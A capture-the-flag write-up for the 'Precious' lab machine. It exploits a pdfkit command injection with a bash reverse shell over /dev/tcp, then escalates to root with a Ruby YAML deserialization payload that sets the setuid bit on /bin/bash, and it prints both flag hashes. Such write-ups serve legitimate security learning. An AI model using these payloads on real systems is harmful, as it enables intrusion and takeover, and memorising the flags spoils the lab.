# Precious
> Write-up author: jon-brandy
## DESCRIPTION:
- NONE
## HINT:
- NONE
## STEPS:
1. First, let's run nmap to check if there are any ports open.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211276690-4fe354b9-3638-442c-9480-5805e5c76317.png)


2. Notice the machines seems running a web application, let's open the host on the web browser.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211276928-1b29c212-2439-47e0-bb58-720df75f81ff.png)


3. Let's enter `http://google.com`.

> RESULT


![image](https://user-images.githubusercontent.com/70703371/211277475-e4846599-d902-479b-b914-f14759cebfd4.png)


4. Already tried to enter my own ip but didn't get any pdf.
5. Let's serve http on port 8000 first.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211278408-539b23c8-4444-4b66-b25c-523dbc65ae6c.png)


![image](https://user-images.githubusercontent.com/70703371/211278442-8bd11666-3bf6-4d31-9e18-6631343ef3ca.png)


6. Great! We got it.
7. Check the meta data, to see if we can grab any clue.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211278752-fed9eaf3-6a3e-4eba-9701-42d0d4a7db02.png)


8. Notice the version of pdfkit is outdated and it's vulnerable.

> WRITTEN IN CVE MITRE

```
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25765
```

9. Hence i did a small outsource about the approach they used for this vuln, found this link.

```
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
```

![image](https://user-images.githubusercontent.com/70703371/211280009-f3ea6bd2-9dcb-4218-9a6c-21564f5b39a0.png)


10. Let's use this payload.

![image](https://user-images.githubusercontent.com/70703371/211281122-658a8d9e-aeef-4b09-9790-90346f7bc779.png)


![image](https://user-images.githubusercontent.com/70703371/211281160-fc388b59-a2b1-4090-ae7c-4f14b5cbe665.png)



11. But change the "sleep" to this:

> REVERSE SHELL FOR BASH

```
bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/443 <&1'
```

> FULL PAYLOAD

```
http://10.10.14.12:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/443 <&1'`'}
```

12. Set a listener using pwncat for port 443 because we use it on the payload, then submit the payload.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211281893-6d255475-b83c-4d5a-a4b4-95e1dca8bb68.png)


13. Nice, got the shell!

![image](https://user-images.githubusercontent.com/70703371/211282031-5b3733aa-a97b-43d1-ba4f-bdd2c5a8d20a.png)


14. Since we're not root, let's find the **user** flag.
15. Actually it took a while for me, i didn't find the user flag, but when i found a cred.

> CRED

![image](https://user-images.githubusercontent.com/70703371/211282795-4ac4805d-0d06-479e-a546-b724ade8623b.png)


![image](https://user-images.githubusercontent.com/70703371/211282841-1ab9201b-0882-42dc-b3db-a58d6251d0bb.png)


![image](https://user-images.githubusercontent.com/70703371/211282892-0983fd9a-a908-4ded-81a6-fd7d9c1e4aed.png)


16. Let's try login to henry with ssh.

> LOGGED IN

![image](https://user-images.githubusercontent.com/70703371/211283134-5b91c51d-bac1-4347-b43c-a4b5accd3f04.png)


![image](https://user-images.githubusercontent.com/70703371/211283181-d5f3768e-9de6-4663-8da5-1e92a3a7d620.png)


![image](https://user-images.githubusercontent.com/70703371/211283211-6ab3fdc2-86c6-4b6d-8e9f-0fe35035fc81.png)


17. Got the user flag.

## FLAG

```
3e73f31984a909e91e2952956243e048
```

18. Now for the root flag, we need to do privilege escalation.

![image](https://user-images.githubusercontent.com/70703371/211283528-aa43f568-2da8-4446-8dd2-9f03df4ef2f8.png)


![image](https://user-images.githubusercontent.com/70703371/211283681-9058d08a-0cb8-476d-85b1-a0ed887b1b1f.png)


![image](https://user-images.githubusercontent.com/70703371/211283919-d9f6f185-50df-428a-93cd-c0ea01e8b8e3.png)


19. Got a clue here:

![image](https://user-images.githubusercontent.com/70703371/211284959-72f6a994-de97-43dc-bdb6-7ddde19ab333.png)


20. Maybe we can do RCE through YAML upload file.
21. I did a small outsource about this yaml exploit. Turns out find [this](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) website and there's a ruby script to do RCE.

> THE SCRIPT

```rb
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
```

22. Change the git_set value to `chmod u+s /bin/bash`.

```rb
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod u+s /bin/bash"
         method_id: :resolve
```

23. Now make a new file named `dependencies.yml` then paste the script inside it. 
24. Next, to run the script, remember what we got from `sudo -l`.

> sudo -l

![image](https://user-images.githubusercontent.com/70703371/211287339-32dbd1cf-041f-4d4e-8e60-2d8629d355a8.png)


25. Hence, the command is -> `sudo /usr/bin/ruby /opt/update_dependencies.rb`

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211289639-890b827a-2837-4666-a99c-587d385b5f19.png)


26. Now run `bash -p`.

> RESULT - GOT ROOT

![image](https://user-images.githubusercontent.com/70703371/211291113-c2f2e37f-bf5a-4df3-8d7a-62c5dab142c6.png)


![image](https://user-images.githubusercontent.com/70703371/211291193-936e3376-89cb-4336-905f-44784a463a7d.png)


27. Got the root flag!

## FLAG

```
dbb4250350277d64ed7effdf09e7b59d
```
